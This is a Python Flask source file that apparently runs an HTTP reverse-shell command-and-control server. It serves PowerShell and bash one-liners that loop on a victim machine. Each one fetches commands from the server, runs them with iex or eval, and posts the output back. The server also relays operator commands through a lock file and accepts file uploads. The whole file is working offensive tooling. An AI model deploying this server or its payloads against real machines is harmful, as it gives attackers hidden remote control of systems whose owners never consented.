#!/usr/bin/python3
# api.py

import os
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from flask import Flask, request
from werkzeug.utils import secure_filename
from config import HOSTNAME, REFRESH_DELAY, ALLOWED_EXTENSIONS


app = Flask(__name__)


def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/', methods=['GET'])
def get_home():
    return get_bash()


@app.route('/windows/', methods=['GET'])
def get_windows():
    return 'While(1){{$c=(Invoke-WebRequest {hostname}/http_reverse_shell/?ready=true).Content;If($c -ne \'\'){{Invoke-WebRequest {hostname}/http_reverse_shell/ -Method Post -Body @{{\'stdout\'=(iex $c|Out-String).Trim("`n")}}}};sleep {delay}}}'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200


@app.route('/bash/', methods=['GET'])
def get_bash():
    return 'while :;do c=$(curl -s {hostname}/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s {hostname}/http_reverse_shell/ --data-urlencode "stdout=$(eval $c)";sleep {delay};done'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200


@app.route('/http_reverse_shell/', methods=['GET'])
def get_http_reverse_shell():
    if not request.args.get('ready'):
        if 'windows' in str(request.user_agent).lower():
            return get_windows()
        elif 'linux' in str(request.user_agent).lower():
            return get_bash()
        else:
            return get_bash()
    with open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'command.lock'), 'r+') as lock:
        command = lock.read().split('\n')[0]
        lock.seek(0)
        lock.truncate()
    return command, 200


@app.route('/http_reverse_shell/', methods=['POST'])
def post_http_reverse_shell():
    if request.form.get('stdout'):
        with open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'stdout.lock'), 'w') as lock:
            lock.write(request.form.get('stdout'))
        return '', 200
    return 'No data', 400


@app.route('/upload/', methods=['POST'])
def post_upload():
    file = request.files.get('file')
    if not file or file.filename == '':
        return 'No file', 400
    if allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file.save(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'tmp', filename))
        return '', 400
    return 'Invalid filename', 400


if __name__ == '__main__':
    app.run('0.0.0.0', 80)
